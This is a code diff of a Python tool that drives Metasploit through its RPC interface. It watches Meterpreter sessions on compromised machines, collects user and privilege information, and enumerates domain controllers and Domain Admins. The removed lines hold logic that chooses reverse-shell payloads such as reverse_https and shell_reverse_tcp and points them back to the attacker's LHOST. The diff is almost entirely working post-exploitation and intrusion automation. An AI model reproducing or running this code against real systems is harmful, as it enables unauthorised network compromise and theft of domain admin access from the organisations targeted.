@@ -4,14 +4,15 @@ import re
 import os
 import sys
 import time
+import signal
 import msfrpc
+import asyncio
 import argparse
 import netifaces
 from IPython import embed
 from termcolor import colored
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
-
 
 def parse_args():
     # Create the arguments
@@ -33,6 +34,12 @@ def print_good(msg):
 
 def print_great(msg):
     print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))
+
+def kill_tasks():
+    print()
+    print_info('Killing tasks then exiting...')
+    for task in asyncio.Task.all_tasks():
+        task.cancel()
 
 def get_iface():
     '''
@@ -64,127 +71,119 @@ def get_local_ip(iface):
     ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
     return ip
 
-def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
-    '''
-    You can set arbitrary options that don't get used which is why we autoinclude
-    ExitOnSession True and SRVHOST (for JBoss); even if we use aux module this just won't do anything
-    '''
-    local_ip = get_local_ip(get_iface())
-    print_info('Setting options on {}'.format(module_path))
-    cmds = """
-           set {} {}\n
-           set RPORT {}\n
-           set LHOST {}\n
-           set SRVHOST {}\n
-           set payload {}\n
-           set ExitOnSession True\n
-           {}\n
-           """.format(rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)
+async def get_shell_info(CLIENT, sess_num):
+    err = None
+    sysinfo_cmd = 'sysinfo'
+    sysinfo_end_str = b'Meterpreter     : '
 
-    return cmds
-
-def get_req_opts(c_id, module):
-    req_opts = []
-    opts = CLIENT.call('module.options', [c_id, module])
-    for opt_name in opts:
-        if b'required' in opts[opt_name]:
-            if opts[opt_name][b'required'] == True:
-                if b'default' not in opts[opt_name]:
-                    req_opts.append(opt_name.decode('utf8'))
-    return req_opts
-
-def get_rhost_var(c_id, req_opts):
-    for o in req_opts:
-        if 'RHOST' in o:
-            return o
-
-def get_payload(module, operating_sys, target_num):
-    '''
-    Automatically get compatible payloads
-    '''
-    payload = None
-    payloads = []
-    win_payloads = ['windows/meterpreter/reverse_https',
-                    'windows/x64/meterpreter/reverse_https',
-                    'java/meterpreter/reverse_https',
-                    'java/jsp_shell_reverse_tcp']
-
-    linux_payloads = ['generic/shell_reverse_tcp',
-                      'java/meterpreter/reverse_https',
-                      'java/jsp_shell_reverse_tcp',
-                      'cmd/unix/reverse']
-    if target_num:
-        payloads_dict = CLIENT.call('module.target_compatible_payloads', [module, int(target_num)])
+    sysinfo_output = await run_session_cmd(CLIENT, sess_num, sysinfo_cmd, sysinfo_end_str)
+    # Catch timeout
+    if type(sysinfo_output) == str:
+        err = sysinfo_cmd
+        return (None, err)
     else:
-        payloads_dict = CLIENT.call('module.compatible_payloads', [module])
+        sysinfo_utf8_out = sysinfo_output.decode('utf8')
+        sysinfo_split = sysinfo_utf8_out.splitlines()
 
-    if b'error' in payloads_dict:
-        if 'auxiliary' not in module:
-            print_bad('Error getting payload for {}'.format(module))
-        else:
-            # For aux modules we just set an arbitrary real payload
-            payload = win_payloads[0]
+    getuid_cmd = 'getuid'
+    getuid_end_str = b'Server username:'
+
+    getuid_output = await run_session_cmd(CLIENT, sess_num, getuid_cmd, getuid_end_str)
+    # Catch timeout
+    if type(getuid_output) == str:
+        err = getuid_cmd
+        return (None, err)
     else:
-        byte_payloads = payloads_dict[b'payloads']
-        for p in byte_payloads:
-            payloads.append(p.decode('utf8'))
+        getuid_utf8_out = getuid_output.decode('utf8')
+        getuid = 'User            : '+getuid_utf8_out.split('Server username: ')[-1].strip().strip()
 
-    # Set a preferred payload based on OS
-    if 'windows' in operating_sys.lower():
-        for p in win_payloads:
-            if p in payloads:
-                payload = p
-    elif 'linux' in operating_sys.lower():
-        for p in linux_payloads:
-            if p in payloads:
-                payload = p
+    # We won't get here unless there's no errors
+    shell_info_list = [getuid] + sysinfo_split
 
-    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
-    if payload == None:
-        if 'auxiliary' not in module:
-            print_bad('No preferred payload found, first and last comapatible payloads:')
-            print('    '+payloads[0])
-            print('    '+payloads[-1])
-            print_info('Skipping this exploit')
-            return
+    return (shell_info_list, err)
 
-    return payload
+def get_domain(shell_info):
+    for l in shell_info:
+        l_split = l.split(':')
+        if 'Domain      ' in l_split[0]:
+            if 'WORKGROUP' in l_split[1]:
+                return False
+            else:
+                domain = l_split[-1].strip()
+                return domain
 
-def get_domain(info):
-    split_info = info.split()
-    dom_user = split_info[0]
-    dom = dom_user.split('\\')[0]
-    host = split_info[-1]
-    if dom != host:
-        return dom
+def is_domain_joined(user_info, domain):
+    info_split = user_info.split(':')
+    dom_and_user = info_split[1].strip()
+    dom_and_user_split = dom_and_user.split('\\')
+    dom = dom_and_user_split[0]
+    user = dom_and_user_split[1]
+    if domain:
+        if dom.lower() in domain.lower():
+            return True
 
-def update_sess_data(CLIENT, domain_data, session, sess_num):
-    info = session[b'info'].decode('utf8')
-    domain = get_domain(info)
+    return False
 
+async def sess_first_check(CLIENT, session, sess_num):
     if b'first_check' not in session:
+
+        # Give meterpeter chance to open
+        await asyncio.sleep(2)
+
+        sess_num_str = str(sess_num)
         session[b'first_check'] = b'False'
-        plat = session[b'platform'].decode('utf8')
-        arch = session[b'arch'].decode('utf8')
-        if domain:
+        session[b'session_number'] = sess_num_str.encode()
+
+        shell_info, err = await get_shell_info(CLIENT, sess_num)
+        if err:
+            # err is the cmd it errored on or the msg
+            session[b'Error'] = err.encode()
+            return session
+
+        domain = get_domain(shell_info)
+
+        # 1st line of shell_info is username like WIN10\\dan
+        domain_joined = is_domain_joined(shell_info[0], domain)
+        if domain_joined == True:
             session[b'domain_joined'] = b'True'
-            domain_data['domain'] = domain
         else:
-            domain = b'Not domain joined'
             session[b'domain_joined'] = b'False'
-        admin_shell, local_admin = is_admin(CLIENT, sess_num)
+
+        if domain:
+            session[b'domain'] = domain.encode()
+        else:
+            domain = 'Not domain joined'
+
+        (admin_shell, local_admin), err = await is_admin(CLIENT, sess_num)
+        # Catch errors
+        if err:
+            session[b'Error'] = err
+            return session
+
         session[b'admin_shell'] = admin_shell
         session[b'local_admin'] = local_admin
-        print_info(info+' '+plat+' '+arch)
-        print('        Domain: '+domain.decode('utf8'))
-        print('        Admin shell: '+admin_shell.decode('utf8'))
-        print('        Local admin: '+local_admin.decode('utf8'))
 
-    return session, domain_data
+        print_good('Shell found')
+        for l in shell_info:
+            print('        '+l)
+        msg =  '''        Admin shell     : {}
+        Local admin     : {}
+        Session number  : {}'''.format( 
+                                  admin_shell.decode('utf8'), 
+                                  local_admin.decode('utf8'),
+                                  sess_num_str)
+        print(msg)
 
-def is_admin(CLIENT, sess_num):
+    return session
+
+async def is_admin(CLIENT, sess_num):
+    err = None
     cmd = 'run post/windows/gather/win_privs'
-    output = run_session_cmd(CLIENT, sess_num, cmd, None)
+    output = await run_session_cmd(CLIENT, sess_num, cmd, None)
+
+    # Catch error
+    if type(output) == str:
+        return (None, None), sess_num
 
     if output:
         split_out = output.decode('utf8').splitlines()
@@ -194,32 +193,45 @@ def is_admin(CLIENT, sess_num):
         local_admin = user_info_list[2]
         user = user_info_list[5]
 
-        # Byte strings
-        return str(admin_shell).encode(), str(local_admin).encode()
+        # Byte string
+        return (str(admin_shell).encode(), str(local_admin).encode()), err
 
     else:
+        return (b'ERROR', b'ERROR'), err
 
-        return b'ERROR', b'ERROR'
-
-def get_domain_controller(CLIENT, domain_data, sess_num):
+async def get_domain_controller(CLIENT, domain_data, sess_num):
     print_info('Getting domain controller...')
     cmd = 'run post/windows/gather/enum_domains'
     end_str = b'[+] Domain Controller:'
-    output = run_session_cmd(CLIENT, sess_num, cmd, end_str).decode('utf8')
+    output = await run_session_cmd(CLIENT, sess_num, cmd, end_str)
+
+    # Catch timeout
+    if type(output) == str:
+        domain_data['err'].append(sess_num)
+        return domain_data
+
+    output = output.decode('utf8')
     if 'Domain Controller: ' in output:
         dc = output.split('Domain Controller: ')[-1].strip()
-        domain_data['domain_controller'] = dc
+        domain_data['domain_controllers'].append(dc)
         print_good('Domain controller: '+dc)
     else:
         print_bad('No domain controller found')
 
     return domain_data
 
-def get_domain_admins(CLIENT, domain_data, sess_num):
+async def get_domain_admins(CLIENT, domain_data, sess_num):
     print_info('Getting domain admins...')
     cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
     end_str = b'[+] User list'
-    output = run_session_cmd(CLIENT, sess_num, cmd, end_str).decode('utf8')
+
+    output = await run_session_cmd(CLIENT, sess_num, cmd, end_str)
+    # Catch timeout
+    if type(output) == str:
+        domain_data['err'].append(sess_num)
+        return domain_data
+
+    output = output.decode('utf8')
     da_line_start = '[*] \t'
 
     if da_line_start in output:
@@ -240,54 +252,100 @@ def get_domain_admins(CLIENT, domain_data, sess_num):
 
     return domain_data
 
-def get_domain_data(CLIENT, session, sess_num, domain_data):
+async def get_domain_data(CLIENT, session, sess_num, domain_data):
     # Check if we did domain recon yet
-    if domain_data['domain_controller'] == None:
+    if domain_data['domain_admins'] == []:
         if session[b'domain_joined'] == b'True':
-            domain_data = get_domain_controller(CLIENT, domain_data, sess_num)
-            domain_data = get_domain_admins(CLIENT, domain_data, sess_num)
+            domain_data = await get_domain_controller(CLIENT, domain_data, sess_num)
+            domain_data = await get_domain_admins(CLIENT, domain_data, sess_num)
 
     return domain_data
 
-def check_sessions(CLIENT, sessions, domain_data):
+async def attack_with_sessions(CLIENT, sessions, domain_data):
+
     if len(sessions) > 0:
+
         for s in sessions:
+
+            # Check for errored out sessions and ignore
+            if b'Error' in sessions[s]:
+                continue
             
-            # Get and print session info if first time we've checked the sess
-            sessions[s], domain_data = update_sess_data(CLIENT, domain_data, sessions[s], s)
-            domain_data = get_domain_data(CLIENT, sessions[s], s, domain_data)
+            # Get and print session info if first time we've checked the session
+            sessions[s] = await sess_first_check(CLIENT, sessions[s], s)
 
-    return sessions, domain_data
+            # Check for errored out sessions and ignore
+            # We edited sessions[s] so we gotta use that instead of session
+            if b'Error' in sessions[s]:
+                continue
+            
+            if b'Domain' in sessions[s]:
+                domain_data['domains'].append(sessions[s][b'Domain'])
 
-def run_session_cmd(CLIENT, sess_num, cmd, end_str):
-    script_errors = [b'[-] Post Failed', b'Error in script']
+            if domain_data['domain_admins'] == []:
+                domain_data = await get_domain_data(CLIENT, sessions[s], s, domain_data)
+
+    return (sessions, domain_data)
+
+async def run_session_cmd(CLIENT, sess_num, cmd, end_str, timeout=10):
+    ''' Will only return a str if we failed to run a cmd'''
+
+    script_errors = [b'[-] post failed', b'error in script', b'operation failed', b'unknown command']
     res = CLIENT.call('session.meterpreter_run_single', [str(sess_num), cmd])
+    error_msg = 'Error in session {}: {}'
+    sess_num_str = str(sess_num)
+
+    if b'error_message' in res:
+        err_msg = res[b'error_message'].decode('utf8')
+        print_bad(error_msg.format(sess_num_str, err_msg))
+        return err_msg
+
     if res[b'result'] == b'success':
 
         counter = 0
-        while True:
-            time.sleep(2)
-            output = CLIENT.call('session.meterpreter_read', [str(sess_num)])[b'data']
+        sleep_secs = 0.2 
+        try:
+            while True:
+                await asyncio.sleep(sleep_secs)
+                output = CLIENT.call('session.meterpreter_read', [str(sess_num)])
 
-            if any(x in output for x in script_errors):
-                return output
+                if b'data' in output:
+                    output = output[b'data']
+                else:
+                    decoded_err = output[b'error_message'].decode('utf8')
+                    print_bad(error_msg.format(sess_num_str, decoded_err))
+                    return decoded_err
 
-            # Check if the ending string is in output or if script errored
-            elif end_str:
-                if end_str in output:
+                # Output errored
+                if any(x in output.lower() for x in script_errors):
+                    print_bad(('Command <{}> in session {} '
+                               'failed with error: {}'
+                               ).format(cmd, str(sess_num), output.decode('utf8')))
                     return output
 
-            # If no terminating string specified just wait 5m
-            elif output == b'':
-                counter += 1
-                # Set default wait time to 5m
-                if counter > 150:
+                # Successfully completed
+                # Check if the ending string is in output or if script errored
+                elif end_str:
+                    if end_str in output:
+                        return output
+
+                # If no terminating string specified just wait 5m
+                elif output == b'':
+                    counter += sleep_secs
+                    # Set default wait time to 1m
+                    if counter > timeout:
+                        return cmd
+
+                else:
                     return output
 
-            else:
-                return output
+        except Exception as e:
+            err = 'exception likely due to abrupt death of session'
+            print_bad(error_msg.format(sess_num_str, err))
+            return err
     else:
         print_bad(res[b'result'].decode('utf8'))
+        return cmd
     
 def get_perm_token(CLIENT):
     # Authenticate and grab a permanent token
@@ -296,15 +354,73 @@ def get_perm_token(CLIENT):
     CLIENT.token = '123'
     return CLIENT
 
+def update_sessions(sessions, updated_sessions):
+    ''' Four keys added after we process a new session: 
+        first_check, domain_joined, local_admin, admin_shell 
+        This function does not overwrite data from MSF
+        it only adds previously known data to the MSF session'''
+    if updated_sessions:
+        # s = session number
+        for s in sessions:
+            if s in updated_sessions:
+                for k in updated_sessions[s]:
+                    if k not in sessions[s]:
+                        sessions[s][k] = updated_sessions[s].get(k)
+
+    return sessions
+
+async def wait_for_session_info(CLIENT, sessions):
+    for s in sessions:
+        if sessions[s][b'info'] == b'':
+            await asyncio.sleep(1)
+            sessions = CLIENT.call('session.list')
+            break
+
+    return sessions
+
+async def check_for_sessions(CLIENT):
+    domain_data = {'domains':[], 
+                   'domain_controllers':[], 
+                   'domain_admins':[], 
+                   'err':[]}
+    updated_sessions = None
+    timed_out_sessions = []
+    print_info('Waiting for Meterpreter shell')
+
+    while True:
+
+        # Get list of MSF sessions from RPC server
+        sessions = CLIENT.call('session.list')
+
+        # Update the session info dict with previously found information
+        sessions = update_sessions(sessions, updated_sessions)
+
+        # Do stuff with the sessions
+        updated_sessions, domain_data = await attack_with_sessions(CLIENT, sessions, domain_data)
+        
+        for s in updated_sessions:
+            if b'Error' in updated_sessions[s]:
+                if s not in timed_out_sessions:
+                    print_bad('Session {} died'.format(str(s)))
+                else:
+                    timed_out_sessions.append(s)
+                
+        await asyncio.sleep(1)
+
 def main(args):
 
     CLIENT = msfrpc.Msfrpc({})
     CLIENT = get_perm_token(CLIENT)
-    sessions = CLIENT.call('session.list')
-    domain_data = {'domain':None, 'domain_controller':None, 'domain_admins':None}
-    while True:
-        sessions, domain_data = check_sessions(CLIENT, sessions, domain_data)
-        time.sleep(.5)
+
+    loop = asyncio.get_event_loop()
+    loop.add_signal_handler(signal.SIGINT, kill_tasks)
+    task = asyncio.ensure_future(check_for_sessions(CLIENT))
+    try:
+        loop.run_until_complete(task)
+    except asyncio.CancelledError:
+        print_info('Tasks gracefully downed a cyanide pill before defecating themselves and collapsing in a twitchy pile')
+    finally:
+        loop.close()
 
 if __name__ == "__main__":
     args = parse_args()
